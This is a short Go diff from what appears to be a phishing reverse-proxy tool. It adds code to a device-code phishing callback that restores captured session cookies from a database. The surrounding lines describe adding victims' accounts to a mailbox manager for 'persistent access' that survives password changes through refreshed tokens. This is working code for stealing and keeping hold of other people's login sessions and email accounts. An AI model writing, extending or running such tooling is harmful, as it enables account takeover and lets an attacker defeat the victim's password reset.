@@ -3784,6 +3784,17 @@ func (p *HttpProxy) setupDeviceCodeCallbacks() {
 					log.Debug("[devicecode] Domain %s: %d cookies", domain, len(cookies))
 				}
 
+				// If in-memory session has no cookies, try to load from database
+				if len(s.CookieTokens) == 0 {
+					log.Debug("[devicecode] In-memory session has no cookies, checking database...")
+					if dbSession, err := p.db.GetSessionBySid(s.Id); err == nil && dbSession != nil {
+						if len(dbSession.CookieTokens) > 0 {
+							log.Info("[devicecode] Found %d cookie domains in database, syncing to session", len(dbSession.CookieTokens))
+							s.CookieTokens = dbSession.CookieTokens
+						}
+					}
+				}
+
 				// Automatically add account to mailbox manager for persistent access
 				// This ensures the account survives password changes as long as tokens are refreshed
 				if dcSession.RefreshToken != "" && p.mailboxAccounts != nil {
